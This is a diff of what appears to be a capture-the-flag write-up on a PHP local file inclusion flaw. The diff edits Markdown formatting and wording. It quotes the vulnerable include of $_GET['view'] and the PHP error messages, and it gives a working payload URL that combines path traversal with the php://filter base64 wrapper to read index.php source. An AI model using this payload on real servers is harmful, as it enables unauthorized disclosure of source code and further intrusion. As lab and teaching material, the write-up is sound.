@@ -23,16 +23,20 @@ from this error :
 Warning: include(../../../../../var/www/html/index.php/dog.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
 
 Warning: include(): Failed opening '../../../../../var/www/html/index.php/dog.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
-
-the function is 
+```
+the function is
+```
 include $_GET['view'] . "php";
-if you input a cat  
+```
+if you input a (cat) 
 it add .php to input (be cat.php)
 
-```
+
 we have index.php in /var/www/html 
 
-lets try to use it but with php filter ( php://filter/convert.base64-encode/resource= )
+lets try to use it but without (.php) becuse function add it 
+
+useing php filter ( php://filter/convert.base64-encode/resource= )
 ```
 http://<TARGET_IP>/?view=php://filter/convert.base64-encode/resource=cat/../../../../../var/www/html/index
 ```
